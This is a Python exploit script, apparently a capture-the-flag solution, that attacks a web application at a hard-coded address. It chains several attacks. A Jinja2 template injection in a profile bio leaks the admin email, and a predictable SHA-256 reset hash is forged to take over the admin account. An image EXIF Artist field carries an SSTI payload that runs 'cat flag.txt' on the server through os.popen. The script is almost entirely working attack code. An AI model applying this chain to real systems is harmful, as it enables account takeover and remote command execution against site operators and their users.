import requests

session = requests.Session()
BASE_URL = "http://83.136.251.67:37129"
SIGN_UP_CNT = "1"
PAYLOAD= "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"

admin_session = requests.Session()

def sign_up(num:str):
    sign_up = {
        "email":"amy"+num+"@gmail.com",
        "username":"amy"+num,
        "password":"amy"+num+num
    }
    
    try:
        response = session.post(url=BASE_URL+"/signup", data=sign_up,timeout=10)
        if "Account created!" in response.text:
            print(f"amy{num} sign up succes")
            return True
        else:
            print("sign up failed")
            return False
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
   

def login(num):
    post_data = {
        "username":"amy"+num,
        "password":"amy"+num+num
    }
    try:
        response = session.post(url=BASE_URL+"/login", data=post_data,timeout=10)
        if "Log in Successfull!" in response.text:
            print(f"amy{num} login succes")
            return True
        else:
            print("login failed")
            return False
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
    
def verification(num:str):
    try:
        filename  = find_jpg_path(num)
        # 方法2: 指定文件名和MIME类型(推荐)
        files = {'file': (filename, open(filename, 'rb'), 'image/jpeg')}

        # 方法3: 使用 with 语句(推荐,自动关闭文件)
        with open(filename, 'rb') as f:
            files = {'file': f}
            response = session.post(url=BASE_URL+"/verification", files=files, timeout=10)
            if 'Your Request has been send to Guild-Master wait for approval.' in response.text:
                print("file upload success")
            else :
                print("file upload failed")
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
    
def find_jpg_path(num:str):
    import os

    # 获取脚本所在目录
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, 'test'+num+'.jpg')
    return output_path

def profile():
    post_data = {
        "bio":"{{User.query.filter_by(username=\"admin\").first().email}}"
    }
    try:
        response = session.post(url=BASE_URL+"/profile", data=post_data,timeout=10)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None


def create_jpg(num:str):
    from PIL import Image
    import piexif
    
    output_path  = find_jpg_path(num)

    # 1. 创建一个 100x100 的白色 JPG 图片
    img = Image.new('RGB', (100, 100), color='white')
    img.save(output_path, 'JPEG')
    print("✓ 已创建 test1.jpg (100x100 白色图片)")

    # 2. 在图片的 EXIF 中添加 artist 标签
    # 读取现有的 EXIF 数据(如果有)
    try:
        exif_dict = piexif.load(output_path)
    except:
        exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}}

    # 设置 Artist 标签为 "PAYLOAD"
    exif_dict["0th"][piexif.ImageIFD.Artist] = PAYLOAD.encode('utf-8')

    # 将 EXIF 数据转换为字节
    exif_bytes = piexif.dump(exif_dict)

    # 重新保存图片并嵌入 EXIF 数据
    img.save(output_path, 'JPEG', exif=exif_bytes)
    print("✓ 已添加 Artist 标签: "+PAYLOAD)

    # 验证：读取并显示 Artist 标签
    exif_dict_verify = piexif.load(output_path)
    if piexif.ImageIFD.Artist in exif_dict_verify["0th"]:
        artist_value = exif_dict_verify["0th"][piexif.ImageIFD.Artist].decode('utf-8')
        print(f"✓ 验证成功 - Artist: {artist_value}")
    else:
        print("✗ 未找到 Artist 标签")

def get_link():
    try:
        response = session.get(url=BASE_URL+"/getlink", timeout=10)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def get_admin_email():
    post_data = {
        "bio":"{{User.query.filter_by(username=\"admin\").first().email}}"
    }
    try:
        response = session.post(url=BASE_URL+"/profile", data=post_data,timeout=10)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
    
def get_admin_email(num:str):
    from bs4 import BeautifulSoup
    try:
        response = session.get(url=BASE_URL+"/user/amy"+num, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        email = soup.select_one('#custom-string p.para-class').text.strip()
        print(f"admin email:{email}")
        return email
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def forget_admin_password(admin_email:str):
    post_data = {
        "email":admin_email
    }
    try:
        response = admin_session.post(url=BASE_URL+"/forgetpassword", data=post_data,timeout=10)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
    
def get_change_passwd_hash(email:str):
    import hashlib
    hash = str(hashlib.sha256(email.encode()).hexdigest())
    print(f"change_passwd_hash: {hash}")
    return hash

def change_admin_pwd(hash:str):
    post_data = {
        "password":"admin"
    }
    try:
        response = admin_session.post(url=BASE_URL+"/changepasswd/"+hash, data=post_data,timeout=10)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def login_admin():
    post_data = {
        "username":"admin",
        "password":"admin"
    }
    try:
        response = admin_session.post(url=BASE_URL+"/login", data=post_data,timeout=10)
        if "Log in Successfull!" in response.text:
            print(f"admin login succes")
            return True
        else:
            print("admin login failed")
            return False
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def verify(num:str):
    post_data = {
        "user_id": int(num) + 1,
        "verification_id":num
    }
    try:
        response = admin_session.post(url=BASE_URL+"/verify", data=post_data,timeout=10)
        print(response.text)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

if sign_up(SIGN_UP_CNT):
    if login(SIGN_UP_CNT):
        create_jpg(SIGN_UP_CNT)
        verification(SIGN_UP_CNT)
        profile()
        get_link()
        admin_email = get_admin_email(SIGN_UP_CNT)
        forget_admin_password(admin_email);
        hash = get_change_passwd_hash(admin_email)
        change_admin_pwd(hash)
        login_admin()
        verify(SIGN_UP_CNT)

